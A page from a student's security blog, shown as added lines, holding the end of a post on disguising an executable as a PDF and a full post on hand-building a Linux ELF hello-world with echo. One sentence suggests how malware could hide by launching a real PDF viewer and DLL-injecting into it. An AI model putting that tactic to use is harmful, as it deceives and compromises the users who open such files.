+<p><img class="center" src="/images/spoofing-file-ext-resources/NotAPDF.png"></p>
+
+<p>When double clicked, the file produced the ouput below. For a malware developer though, it would make sense to have the exe launch a real pdf viewer as a sub process. Then, while it’s open, have the malware inject itself into the real pdf viewer using dll injection quietly.</p>
+
+<p><img class="center" src="/images/spoofing-file-ext-resources/woops.png"></p>
+
+<p>On windows, I recommend right clicking on the file and viewing its properties to verify its file type before double clicking.</p>
+
+<p><img class="center" src="/images/spoofing-file-ext-resources/properties.png"></p>
+</div>
+  
+  
+
+
+      <footer>
+      
+      - <a href="/blog/2015/01/15/spoofing-file-extensions/">Spoofing File Extensions</a>
+      <time datetime="2015-01-15T13:06:02-05:00" pubdate><span class='month'>Jan</span> <span class='day'>15</span> <span class='year'>2015</span></time>
+      
+      </footer>
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/12/31/writing-a-linux-executable-using-only-echo/">Writing a Linux Executable Using Only Echo</a></h1>
+    
+    
+      <div class="post-meta">
+        <p class="meta">
+          <span class="timestamp">- 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2014-12-31T12:51:33-05:00" pubdate data-updated="true"></time> -</span>
+          
+        </p>
+      </div>
+    
+  </header>
+
+
+  <div class="entry-content"><p>This Monday I decided to write a linux executable (elf) without using a compiler! I’ve always been a huge fan of low level programming exercises so this came pretty naturally. There was hardly any information on how to do this online so it took some real software engineering to get it to work. It would be pretty tedious to explain every line of bytes in this article but I put everything into a well commented bash script here: <a href="https://github.com/quantumvm/Elf-from-echo/blob/master/elfFromScratch">https://github.com/quantumvm/Elf-from-echo/blob/master/elfFromScratch</a></p>
+
+<p>I used four tools to actually put things together, vim for writing a bash script to document what I was doing, echo to actually get the bytes I need, reaelf to make sure the elf file was being interpreted correctly, and ht editor as a simple hex editor and to view more information about the executable. I had to use a few extra flags on echo to make sure things were being interpreted correctly “-n” to prevent a newline from being appended, and “-e” to make sure bytes like “\x90” were actually being interpreted as bytes and not 4 ascii characters.</p>
+
+<p>The man pages do a great job at explaining the structure of an elf by giving its representation as a series of structs. The only important ones I cared about to get the program to run were the ElfN_Ehdr struct, the Elf32_Phdr struct, and the Elf32_Shdr struct. These correspond to the elf header, program headers, and section headers.</p>
+
+<p>First up was the elf header. It’s really important to get this part right. Although the program header will described what stuff in your file that will get loaded into memory, the elf header will describe where the program header is located, where the section header is located, and most importantly where in memory the program will start executing (yes this is something you can really modify just wait until the post on modifying msfvenom part 2)</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define EI_NIDENT 16</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">e_ident</span><span class="p">[</span><span class="n">EI_NIDENT</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_type</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_machine</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint32_t</span>      <span class="n">e_version</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">ElfN_Addr</span>     <span class="n">e_entry</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">ElfN_Off</span>      <span class="n">e_phoff</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">ElfN_Off</span>      <span class="n">e_shoff</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint32_t</span>      <span class="n">e_flags</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_ehsize</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_phentsize</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_phnum</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_shentsize</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_shnum</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">uint16_t</span>      <span class="n">e_shstrndx</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span> <span class="n">ElfN_Ehdr</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, the size in bytes is given to the left while the actual field is given to the right. For example “uint32_t e_version;” can be interpreted as 4 bytes that describe the version of the elf file.</p>
+
+<p>I found out some tools like ht actually depend on the e_entry when giving a projection of the contents of the instructions into memory. This is a VERY bad way to show the projection of instructions into memory. It can give very inaccurate results since instructions may not necessarily be loaded in the same spot of memory as the execution begins if the elf file is built in a strange way.</p>
+
+<p>Since I was building this elf file myself I decided to play around with things and build the elf file in a strange way on purpose. Normally the structure of an elf file will look like the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="n">Elf_header</span>
+</span><span class='line'>  <span class="n">Program_header</span>
+</span><span class='line'>  <span class="n">Instructions</span>
+</span><span class='line'>  <span class="n">Section_headers</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I decided to build the program like this for fun:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="n">Elf_header</span>
+</span><span class='line'>  <span class="n">Program_header</span>
+</span><span class='line'>  <span class="n">Section_headers</span>
+</span><span class='line'>  <span class="n">Instructions</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Surprisingly everything still ran perfectly yay!</p>
+
+<p>Writing the program headers/section headers was pretty boring so I won’t include that process here. Its easier to just see how that was done by taking a look at the bash file for the project. I will make a comment on the section headers though. When designing the program I initially only wanted to have one section header that accounted for the text segment of the program. To make sure everything worked I ended up with two section headers, one which accounted for the “&lt;.text>” segment of the program and the other which accounted for the names of each section. I could have ended up with three section headers but I decided to make this elf file “stripped”</p>
+
+<p>As I found out when you compile an assembly file with nasm and then link it with ld you normally will end up with an additional section header/struct that describes the symbol table. In my program I decided to leave this symbol table out. This was roughly equivalent to using the command strip on the executable.</p>
+
+<p>I didn’t feel like having to go through the hassle of dealing with loaded libraries since this was meant to be a simple program. I decided to rely on my shellcode writing skills and instead write all the needed instructions for a simple hello world program via Linux system calls. First I wrote out my program in assembly and then translated it into bytes later:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#push $0xa</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\x6a\x0a&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'><span class="c">#push $0x21646c72</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\x68\x72\x6c\x64\x21&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'><span class="c">#push $0x6f77206f</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\x68\x6f\x20\x77\x6f&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'><span class="c">#push $0x6c6c6568</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\x68\x68\x65\x6c\x6c&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#mov $0xd,%edx</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\xba\x0d\x00\x00\x00&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'><span class="c">#mov %esp,%ecx</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\x89\xe1&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'><span class="c">#mov $0x1,%ebx</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\xbb\x01\x00\x00\x00&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#mov $0x4,%eax</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\xb8\x04\x00\x00\x00&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'><span class="c">#int $0x80</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\xcd\x80&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#mov $0x1,%eax</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\xb8\x01\x00\x00\x00&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span><span class='line'><span class="c">#int $0x80</span>
+</span><span class='line'><span class="nb">echo</span> -en <span class="s2">&quot;\xcd\x80&quot;</span> &gt;&gt; <span class="nv">$1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One odd thing you may notice about the assembly is the 4 pushes and later mov esp, ecx. What was effectively doing was placing the string “hello world!” onto the stack and then moving a pointer to this string into the register ecx. The system call that that the assembly makes is a call to write. This is done by moving the value 0x4 into the register eax and then making a call to int 0x80. The second function call happens just after this by moving the value 0x1 into eax and then making a call to int 0x80. This was just a function call to exit so the program quit cleanly.</p>
+
+<p>Wrapping things up, I was really proud of the fact I got this to work. Sometimes with developments such as object oriented programming and interpreted languages like java, it can get real easy to become so caught up in abstraction you completely forget your just dealing with a simple state machine.</p>
+</div>
+  
+  
+
+
+      <footer>
+      
+      - <a href="/blog/2014/12/31/writing-a-linux-executable-using-only-echo/">Writing a Linux Executable Using Only Echo</a>
+      <time datetime="2014-12-31T12:51:33-05:00" pubdate><span class='month'>Dec</span> <span class='day'>31</span> <span class='year'>2014</span></time>
+      
+      </footer>
+    </article>
+  
+  <div class="pagination">
+    
+    <a class="prev" href="3">&larr; Older</a>
+    
+    <a href="/archives">Blog Archives</a>
+    
+    <a class="next" href="1">Newer &rarr;</a>
+    
+  </div><!-- /div.pagination -->
+</div><!-- /div.blog-index -->
+
+      </div><!-- /div#content -->
+    </div><!-- /div#main -->
+  </div><!-- /div.container -->
+  <footer><div id="footer-widgets-wrapper">
+  <div id="footer-first" class="footer-widget">
+    <h3>About Me</h3>
+    <p>Hacker, programmer, tinkerer want to do all the things.</p>
+    <section class="about-me">
+      
+      <div>
+        <ul>
+          
+            <li>GitHub: <a href="https://github.com/quantumvm">@quantumvm</a></li>
+          
+          
+            <li>Twitter: <a href="https://twitter.com/sheepshellcode">@sheepshellcode</a></li>
+          
+            <li>Blog: <a href="http://quantumvm.github.io//github">http://quantumvm.github.io//github</a></li>
+        </ul>
+      </div>
+    </section>
+  </div><!-- /div#footer-second -->
+
+  <div id="footer-second" class="footer-widget">
+    <h3>Involvement</h3>
+	<img src="/images/SIT-ROOM.jpg" height=122 width=163 />
+	<p>Most of my involvement revolves around being president of a club at UF called The Student Information Security Team.<b><p>
+
+	Take a look:
+	 
+	<a href="http://www.ufsit.org">www.ufsit.org</a> 
+	
+  </div><!-- /div#footer-second -->
+
+  <div id="footer-third" class="footer-widget">
+    <h3>Academics</h3>
+	<img src="/images/profile.jpg" height=122 width=140 />
+  	<p>I am a Computer Science (Engineering) student at the University of Florida.</p>
+	<p>B.S. Expected May 2016</p>
+  </div><!-- /div#footer-third -->
+</div><!-- /div#footer-widgets-wrapper -->
+
+<div id="credit" role="contentinfo">
+  <p>
+    Copyright &copy; 2016 - <a href="https://github.com/Vincent Moscatello/">Vincent Moscatello</a> -
+    <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+  </p>
+</div>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
